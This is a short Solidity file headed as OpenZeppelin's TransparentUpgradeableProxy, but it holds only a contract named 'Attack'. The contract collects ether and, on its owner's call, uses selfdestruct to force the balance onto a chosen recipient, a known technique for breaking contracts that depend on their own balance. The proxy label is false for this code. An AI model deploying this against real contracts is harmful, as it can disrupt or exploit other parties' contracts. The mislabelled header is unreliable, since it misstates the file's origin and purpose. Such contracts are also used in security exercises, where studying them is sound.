// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (proxy/transparent/TransparentUpgradeableProxy.sol)

pragma solidity ^0.8.0;

//import "Ownable.sol";
//import "ERC1967Proxy.sol";
//import "Initializable.sol";
//import "IERC20.sol";

contract Attack {
    address payable owner;
    address payable recipient;

    constructor(address payable _recipient) {
        owner = payable(msg.sender);
        recipient = _recipient;
    }

    receive() external payable {}

    function destroy() public {
        require(msg.sender == owner);
        selfdestruct(recipient);
    }
}
